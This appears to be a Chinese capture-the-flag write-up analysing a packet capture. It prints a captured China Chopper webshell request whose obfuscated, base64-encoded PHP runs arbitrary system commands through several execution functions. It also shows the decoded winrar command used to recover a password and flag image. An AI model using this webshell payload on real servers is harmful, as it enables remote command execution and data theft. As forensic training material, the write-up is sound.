#### 2、流量分析
##### 打开数据包总共才56个包，跟踪一下tcp流：

```
POST /0919.php HTTP/1.1
Accept-Language: en-us
Content-Type: application/x-www-form-urlencoded
Referer: http://172.16.6.132/
X-Forwarded-For: 167.110.38.33
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Host: 172.16.6.132
Content-Length: 1773
Cache-Control: no-cache

pass=(@$_E=CREATE%2E_FUNC%2ETION)%2E($_S=@$_E(NULL,EV%2E(C%26E)%2EL%2E(a^I)%2EBAS%2EE64_DE%2Ecode%2E(a^I)%2E(a^E)%2E_POST%2E(a|Z)%2Ez0%2E(d|Y)%2E(a^H)%2E(a^H)%2E(n^U)))%2E$_S();&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oJy0%2BfCcpOyRwPWJhc2U2NF9kZWNvZGUoJF9QT1NUWyJ6MSJdKTskcz1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejIiXSk7JGQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pOyRjPXN1YnN0cigkZCwwLDEpPT0iLyI/Ii1jIFwieyRzfVwiIjoiL2MgXCJ7JHN9XCIiOyRyPSJ7JHB9IHskY30iOyRyZXQ9MTt0cnl7QHN5c3RlbSgkci4nIDI%2BJjEnLCRyZXQpO2lmKCRyZXQhPTApQHBhc3N0aHJ1KCRyLicgMj4mMScsJHJldCk7aWYoJHJldCE9MCl7JHo9QHNoZWxsX2V4ZWMoJHIuJyAyPiYxJyk7JHJldD0odHJpbSgkeik9PScnKT8xOjA7ZWNobygkeik7fWlmKCRyZXQhPTApe0BleGVjKCRyLicgMj4mMScsJHosJHJldCk7ZWNobygkej1qb2luKHN1YnN0cigkZCwwLDEpPT0nLyc/IlxuIjoiXHJcbiIsJHopKTt9aWYoJHJldCE9MCl7JGE9YXJyYXkoYXJyYXkoJ3BpcGUnLCdyJyksYXJyYXkoJ3BpcGUnLCd3JyksYXJyYXkoJ3BpcGUnLCd3JykpOyRmcD1AcHJvY19vcGVuKCRyLicgMj4mMScsJGEsJHBpKTskej1zdHJlYW1fZ2V0X2NvbnRlbnRzKCRwaVsxXSk7JHJldD0odHJpbSgkeik9PScnKT8xOjA7ZWNobygkeik7QHByb2NfY2xvc2UoJGZwKTt9aWYoJHJldCE9MCl7aWYoKCRmcD1AcG9wZW4oJHIuJyAyPiYxJywncicpKSE9RkFMU0UpeyR6PScnO3doaWxlKCFmZW9mKCRmcCkpeyR6Lj1mZ2V0cygkZnApO30kcmV0PSh0cmltKCR6KT09JycpPzE6MDtlY2hvKCR6KTtAcGNsb3NlKCRmcCk7fX1pZigkcmV0IT0wJiZzdWJzdHIoJGQsMCwxKSE9Ii8iJiZjbGFzc19leGlzdHMoJ0NPTScpKXskdz1uZXcgQ09NKCdXU2NyaXB0LnNoZWxsJyk7JG09JHctPmV4ZWMoJHIuJyAyPiYxJyk7JGY9JG0tPlN0ZE91dCgpOyR6PSRmLT5SZWFkQWxsKCk7JHJldD0odHJpbSgkeik9PScnKT8xOjA7ZWNobygkeik7fX1jYXRjaChFeGNlcHRpb24gJGUpe2VjaG8gJyBNZXNzYWdlOiAnLiRlLT5nZXRNZXNzYWdlKCk7fXByaW50ICgkcmV0IT0wKT8icmV0PXskcmV0fSI6Jyc7ZXhpdCgnfDwtJyk7&z1=Y21k&z2=Y2QgL2QgIkM6XHBocFxodGRvY3MiJndpbnJhciBhIC1wa0BlI3kxMDIwIGtleS5yYXIga2V5LmpwZyZlY2hvIFtTXSZjZCZlY2hvIFtFXQ==HTTP/1.1 200 OK
Date: Wed, 20 Sep 2017 08:52:12 GMT
Server: Apache/2.0.63 (Win32) PHP/5.2.14
X-Powered-By: PHP/5.2.14
Content-Length: 32
Content-Type: text/html

->|[S]
C:\php\htdocs
[E] 
|<-
```
##### 将菜刀马中z1的参数base64解密：

```
cd /d "C:\php\htdocs"&winrar a -pk@e#y1020 key.rar key.jpg&echo [S]&cd&echo [E]
```

```
winrar -p密码，所以密码为：k@e#y1020
```
##### 导出文件后，选择对应的大小大的php文件，去除菜刀头```->|```后改后缀rar。
![image](https://github.com/jackey815/writeup/blob/master/misc2/2.png)
#####  解压后得到图片key：
![image](https://github.com/jackey815/writeup/blob/master/misc2/key1.jpg)